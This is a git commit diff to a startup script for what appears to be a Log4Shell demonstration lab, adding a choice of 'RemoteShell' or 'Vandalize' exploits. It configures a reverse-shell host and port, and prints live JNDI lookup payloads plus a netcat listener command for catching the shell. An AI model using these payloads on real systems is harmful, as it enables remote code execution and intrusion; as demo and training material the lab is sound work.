50548afc773a3a037389e01d2b08dcf6ab13a23b
Eric <eric.smalling@snyk.io>
2023-09-19 15:14:36 -0500

    adding remoteshell

--- startup.sh
+++ startup.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 set -e
 
-
 REPO_PROMPT="Enter the image repository name (DockerHub username or other registry) )"
 if [[ -z "${REPO}" ]]; then
   read -p "${REPO_PROMPT}:" REPO_INPUT
@@ -10,8 +9,43 @@ else
 fi
 export REPO=${REPO_INPUT:-$REPO}
 
-# if "build" passed as argument, build images
-if [[ $1 == "build" ]]; then
+echo "Which Log4Shell Exploit would you like to use?"
+select EXPLOIT_TYPE in "RemoteShell" "Vandalize"; do
+  export EXPLOIT_TYPE
+  break
+done
+
+
+
+if [[ $EXPLOIT_TYPE == "RemoteShell" ]]; then
+  select REMOTE_HOST in "localhost" "rsh.smalls.xyz" "civorsh.smalls.xyz" "other"; do
+    if [[ $REMOTE_HOST == "other" ]]; then
+      read -p "Enter remote host to connect to: " REMOTE_HOST
+    fi
+    export REMOTE_HOST
+    break
+  done
+
+  read -p "Enter remote port to connect to [9000]: " REMOTE_PORT  
+  export REMOTE_PORT=${REMOTE_PORT:-9000}
+
+ if [[ $1 != "build" ]]; then
+    echo "NOTE: RemoteShell requires a java file to be modified."
+    echo "If you are entering a new remote host/port from prior image builds, you should re-build them."
+    read -p "Build images now? [y/N]: " BUILD_IMAGES_YN
+  fi 
+
+  cp todolist/exploits/log4shell-server/src/main/java/RemoteShell.java /tmp/RemoteShell.java
+
+  # Have to set line this way because envsubst will delete it otherwise
+  export line='$line'
+  cat /tmp/RemoteShell.java | envsubst > todolist/exploits/log4shell-server/src/main/java/RemoteShell.java
+  unset line
+fi
+
+
+# if "build" passed as argument, or BUILD_IMAGES_YN is "y" (case insensitive) do the build
+if [[ $1 == "build" ]] || [[ $BUILD_IMAGES_YN =~ ^[Yy]$ ]]; then
   echo "Building and pushing docker images"
 
   #if depot is in PATH, use it, otherwise use docker
@@ -28,18 +62,25 @@ if [[ $1 == "build" ]]; then
   echo "  ${IMAGE_BUILDER}client found, will use it to build and push images"
   echo
 
-  $IMAGE_BUILDER -t $REPO/thumbnailer:latest --platform=linux/amd64 thumbnailer $IMAGE_FLAGS
-  $IMAGE_BUILDER -t $REPO/todolist:latest --platform=linux/amd64  todolist $IMAGE_FLAGS
-  $IMAGE_BUILDER -t $REPO/log4shell-server:latest --platform=linux/amd64 todolist/exploits/log4shell-server $IMAGE_FLAGS
+  $IMAGE_BUILDER -t $REPO/thumbnailer:latest --platform=linux/amd64,linux/arm64 thumbnailer $IMAGE_FLAGS
+  $IMAGE_BUILDER -t $REPO/todolist:latest --platform=linux/amd64,linux/arm64  todolist $IMAGE_FLAGS
+  $IMAGE_BUILDER -t $REPO/log4shell-server:latest --platform=linux/amd64,linux/arm64 todolist/exploits/log4shell-server $IMAGE_FLAGS
 
   if [[ $IMAGE_BUILDER == *"docker"* ]]; then
     docker push $REPO/thumbnailer:latest
     docker push $REPO/todolist:latest
     docker push $REPO/log4shell-server:latest
   fi
+
+  # if /tmp/RemoteShell.java exists, restore it
+  if [[ -f /tmp/RemoteShell.java ]]; then
+    cp /tmp/RemoteShell.java todolist/exploits/log4shell-server/src/main/java/RemoteShell.java
+    rm /tmp/RemoteShell.java
+  fi
 fi
 
 echo "Deploying to kubernetes"
+# cat manifests/*.yaml | envsubst
 cat manifests/*.yaml | envsubst | kubectl apply -f -
 
 echo "Waiting for deployments to be ready"
@@ -52,3 +93,11 @@ while [ -z $ip ]; do
   [ -z "$ip" ] && sleep 10
 done
 echo "Application appears to up and running, open http://${ip}/todolist in your browser."
+echo
+if [[ $EXPLOIT_TYPE == "RemoteShell" ]]; then
+  echo "To exploit Log4Shell RemoteShell, run the following command on the remote host: nc -lvn ${REMOTE_PORT}"
+  echo 'Log into the application and search for the following string: ${jndi:ldap://ldap.darkweb:80/#RemoteShell}'
+  echo "Attempt to send commands from the nc session."
+else
+  echo 'To exploit Log4Shell Vandalize, log into the application and search for the following string: ${jndi:ldap://ldap.darkweb:80/#Vandalize}'
+fi
